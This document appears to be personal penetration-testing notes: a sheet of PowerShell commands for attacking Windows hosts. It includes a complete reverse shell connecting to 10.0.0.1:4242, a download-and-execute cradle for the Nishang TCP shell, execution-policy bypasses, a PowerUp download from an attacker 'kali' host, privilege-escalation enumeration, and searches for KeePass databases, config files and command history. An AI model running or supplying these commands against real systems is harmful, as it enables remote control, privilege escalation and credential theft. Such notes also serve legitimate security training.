```
powershell -ExecutionPolicy Bypass -File script.ps1
```

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

```
powershell iex(New-Object Net.WebClient).DownloadString('http://ip/Invoke-PowerShellTcp.ps1');
```

```
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ip/filename.ext','C:\filelocation\filename.ext')"
```

```
Start-Service GammaService
```

```
Stop-Service GammaService
```

https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.3

**Invoke-WebRequest**

```
iwr http://kali/PowerUp.ps1 -Outfile PowerUp.ps1
```

```
powershell -ep bypass
```

```
..\PowerUp.ps1
```

```
Get-UnquotedService
```

```
 Get-Acl -Path C:\ | Format-List
```

```
icacls .\Documents\BetaServ.exe
```

```
Get-LocalUser
```

```
Get-LocalGroup
```

```
Get-LocalGroupMember adminteam
```

```
Get-LocalGroupMember Administrators
```

```
systeminfo
```

```
ipconfig /all
```

```
route print
```

```
netstat -ano
```

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```
Get-History
```

```
(Get-PSReadlineOption).HistorySavePath
```


